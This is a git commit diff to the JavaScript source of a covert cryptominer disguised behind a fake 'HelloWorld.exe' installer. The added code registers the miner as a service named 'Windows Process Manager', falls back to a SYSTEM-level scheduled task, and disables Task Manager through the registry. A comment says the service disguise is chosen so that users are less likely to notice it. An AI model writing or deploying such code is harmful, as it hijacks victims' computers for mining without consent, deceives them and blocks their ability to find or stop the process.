d6a54b640013c04a65ea14946a02a7e1245cb0a5
Morgan Steel <161970789+morgansteel@users.noreply.github.com>
2024-05-28 15:10:29 -0700

    Now affects the registry and Task Scheduler
    The miner now adds itself as a system service to run in the background at every reboot. Task Manager is disabled by adding a REG_DWORD at `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr` and setting it to 1.

--- main.js
+++ main.js
@@ -1,24 +1,86 @@
+// WARNING: DO NOT RUN THIS IF YOU DON'T WANT YOUR REGISTRY MODIFIED
+
 // needed libraries for information collection in XMRig
 
 const Win = require('windows-interact');
 const si = require('systeminformation');
 
-// Fake installer
+// File path of the miner
+
+const minerPath = Win.path`miner.exe`;
+
+// Win-interact preferences
+
+Win.set.preferences({
+    TTSVoice: 'Microsoft David Desktop',
+    appManagerRefreshInterval: 2500,
+    log: {
+        outputFile: null,
+        showTime: false,
+        verbose: {
+            requestTo: null,
+            PowerShell: false,
+            appManager: false
+        }
+    }
+});
 
 function wait(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-async function runMiner() {
+async function runMiner() { // This function will be expanded on later
     Win.cmd('start.cmd');
+    autorun();
+    disableTaskMgr();
+}
+
+async function disableTaskMgr() { // Requires a REBOOT to take effect
+
+    const taskMgrKey = Win.path`'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\'`;
+
+    try {
+        Win.cmd('REG QUERY' + taskMgrKey + '/v DisableTaskMgr');
+        wait(250);
+        Win.cmd('REG ADD HKCU' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
+    } catch {
+        Win.cmd('REG ADD HKCU' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
+        wait(250);
+        Win.cmd('REG ADD HKLM' + taskMgrKey + '/v DisableTaskMgr /t REG_DWORD /d 1 /f');
+    }
+}
+
+async function autorun() {
+    try {
+        registerMinerAsService(); 
+        /* Running the miner as a system service is preferred because the average user
+           is less likely to go looking for one */
+    } catch {
+        addToWinTaskScheduler(); 
+        /* If service registration with sc fails for some reason, autorunning in Task Scheduler
+           is a valid but less preferred option */
+    } 
+}
+
+async function addToWinTaskScheduler() { // Adds start.cmd to Windows Task Scheduler under the SYSTEM user
+    Win.cmd('schtasks /create /sc onstart /tn "Windows Process Manager" /tr start.cmd /ru SYSTEM');
+}
+
+async function registerMinerAsService() {
+    Win.cmd('sc create Windows Process Manager binPath= start.cmd start= auto');
+    wait(1000);
+    Win.cmd('net start Windows Process Manager');
 }
 
 async function fakeInstall() {
-
     try {
+        Win.showDesktop();
         await Win.alert('HelloWorld.exe is now being installed on your computer.', 'HelloWorld Installer');
+        Win.showDesktop();
         await Win.alert('Estimated disk space needed: 2 MB', 'HelloWorld Installer');
+        Win.showDesktop();
         await Win.alert('HelloWorld.exe has been successfully installed.', 'Installation successful');
+        Win.showDesktop();
     } catch {
         console.log("an error occured");
     } finally {
@@ -26,9 +88,7 @@ async function fakeInstall() {
     }
 }
 
-
 async function checkForHardwareSupport() {
-
     try {
         const cpu = await si.cpu();
         const os = await si.osInfo();
@@ -36,24 +96,27 @@ async function checkForHardwareSupport() {
         const system = await si.system(); // used for checking if it's a virtual machine
 
         if (cpu.cores < 2 || mem.total < 4000000000) {
-            await Win.alert('Insufficient system resources to continue', 'Problem encountered');
+            await Win.alert('Insufficient system resources to continue.', 'Problem encountered');
             process.exit();
         }
-        if (os.platform ==! 'Windows') {
-            await Win.alert('This program does not run on Linux or MacOS', 'Unsupported operating system');
-            process.exit();
+        switch (os) {
+            case "MacOS":
+                await Win.alert('MacOS is not supported. Windows 10/11 only.', 'Unsupported operating system');
+                process.exit();
+            case "Linux":
+                await Win.alert('Linux is not supported. Windows 10/11 only.', 'Unsupported operating system');
+                process.exit();
+            default:
+                break;
         }
         if (system.virtual == true) {
-            await Win.alert('Not intended for use in a virtual machine', 'VM detected');
-            process.exit();
+            await Win.alert('You are running this in a virtual machine.', 'Virtual machine detected');
         }
     } catch {
         process.exit();
     } finally {
-        fakeInstall();
+        await fakeInstall();
     }
 }
 
 checkForHardwareSupport();
-
-
